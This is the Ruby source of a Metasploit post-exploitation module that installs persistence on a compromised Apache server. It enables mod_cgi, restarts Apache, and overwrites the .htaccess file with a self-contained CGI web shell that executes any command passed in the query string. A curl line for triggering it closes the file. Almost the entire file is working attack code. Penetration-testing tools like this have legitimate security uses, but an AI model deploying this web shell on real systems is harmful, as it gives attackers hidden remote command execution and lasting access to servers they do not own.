##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Apache .htaccess Persistence',
        'Description' => %q{
          This module writes a persistence payload into an Apache
          .htaccess file using mod_cgi. The .htaccess file itself
          acts as a CGI shell, executing commands passed via the
          QUERY_STRING. Inspired by the htshells project.
        },
        'License' => MSF_LICENSE,
        'Author' => [
          'wireghoul', # htshells project
          '4ravind-b'  # msf module
        ],
        'Platform' => ['linux'],
        'SessionTypes' => ['meterpreter', 'shell'],
        'References' => [
          ['URL', 'https://github.com/wireghoul/htshells'],
          ['ATT&CK', Mitre::Attack::Technique::T1546_EVENT_TRIGGERED_EXECUTION]
        ],
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION, EVENT_DEPENDENT],
          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES]
        }
      )
    )

    register_options([
      OptString.new('HTACCESS_PATH', [true, 'Full path to .htaccess file', '/var/www/.htaccess']),
      OptBool.new('RESTART_APACHE', [true, 'Restart Apache after changes', true])
    ])
  end

  def run
    htaccess_path = datastore['HTACCESS_PATH']

    # Step 1 - Check file exists and writable
    fail_with(Failure::NoAccess, "#{htaccess_path} does not exist!") unless exists?(htaccess_path)
    fail_with(Failure::NoAccess, "#{htaccess_path} is not writable!") unless writable?(htaccess_path)

    # Step 2 - Check Apache is running
    unless command_exists?('apache2') || command_exists?('httpd')
      fail_with(Failure::NotFound, 'Apache is not running!')
    end

    # Step 3 - Backup original .htaccess to loot
    print_status("Backing up #{htaccess_path} to loot...")
    original = read_file(htaccess_path)
    backup = store_loot(
      'htaccess.backup',
      'text/plain',
      session,
      original,
      '.htaccess',
      'Original .htaccess backup'
    )
    print_good("Backup saved to: #{backup}")

    # Step 4 - Check and enable mod_cgi
    print_status('Checking Apache modules...')
    mod_check = cmd_exec('apache2ctl -M 2>/dev/null || httpd -M 2>/dev/null')
    unless mod_check.include?('cgi')
      print_status('Enabling mod_cgi...')
      cmd_exec('a2enmod cgi')
    end

    # Step 5 - Restart Apache if option set
    if datastore['RESTART_APACHE']
      print_status('Restarting Apache...')
      cmd_exec('/etc/init.d/apache2 restart')
      print_good('Apache restarted!')
    end

    # Step 6 - Build payload following wireghoul's exact format
    # The shebang makes it executable as shell script
    # The \ at end of comment line is the magic trick:
    # Apache sees it as a comment continuation
    # but bash executes the echo line as a command
    htaccess_payload = "#!/bin/sh\n"
    htaccess_payload += "# Self contained .htaccess web shell - htshells project\n"
    htaccess_payload += "# Written by Wireghoul - http://www.justanotherhacker.com\n"
    htaccess_payload += "# This is considered a line spanning comment in apache and not by shell #winning \\\n"
    htaccess_payload += "echo -en \"Content-Type: text/plain\\r\\n\\r\\n\";cmd=$(echo $QUERY_STRING | sed -e's/+/ /g' -e's/%20/ /g' -e's/cmd=//g');echo \"\\$ $cmd\";$cmd 2>&1;exit\n"
    htaccess_payload += "<Files ~ \"^\\.ht\">\n"
    htaccess_payload += "    Order allow,deny\n"
    htaccess_payload += "    Allow from all\n"
    htaccess_payload += "</Files>\n"
    htaccess_payload += "Options +ExecCGI\n"
    htaccess_payload += "AddHandler cgi-script .htaccess\n"

    # Step 7 - Check if already written
    existing = read_file(htaccess_path)
    if existing.include?('AddHandler cgi-script .htaccess')
      print_warning('Payload already exists in .htaccess, skipping write')
    else
      print_status("Writing payload to #{htaccess_path}")
      write_file(htaccess_path, htaccess_payload)
      chmod(htaccess_path, 0o755)
      print_good('Payload written!')
    end

    print_good('Persistence deployed!')
    print_status("Trigger: curl 'http://TARGET/.htaccess?cmd=whoami'")
  end
end
